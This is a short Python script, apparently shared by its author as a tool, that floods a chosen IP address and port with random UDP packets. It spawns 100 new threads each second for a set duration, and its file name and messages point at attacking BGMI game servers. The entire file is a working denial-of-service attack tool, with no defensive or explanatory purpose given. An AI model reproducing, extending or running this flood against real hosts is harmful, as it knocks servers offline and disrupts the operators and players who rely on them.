## made by @IamAyanYT
# IamAyanYT All rights reserved 
# licenced

import time
import socket
import random
import threading
import sys

def run(ip, port, duration):
    data = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP = SOCK_DGRAM
            addr = (ip, port)
            s.sendto(data, addr)
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            s.close()

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python3 bgmi_attack.py <target> <port> <duration>")
        sys.exit(1)

    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    # Start the attack using multiple threads
    threads_per_second = 100
    thread_list = []

    print("Attack started")
    
    start_time = time.time()
    end_time = start_time + duration

    while time.time() < end_time:
        # Start threads_per_second new threads every second
        for _ in range(threads_per_second):
            th = threading.Thread(target=run, args=(ip, port, duration))
            th.start()
            thread_list.append(th)

        # Sleep for a second before starting new threads
        time.sleep(1)

    # Print once when the attack duration has ended
    print(f"Attack finished after {duration} seconds.")

#made by @IamAyanYT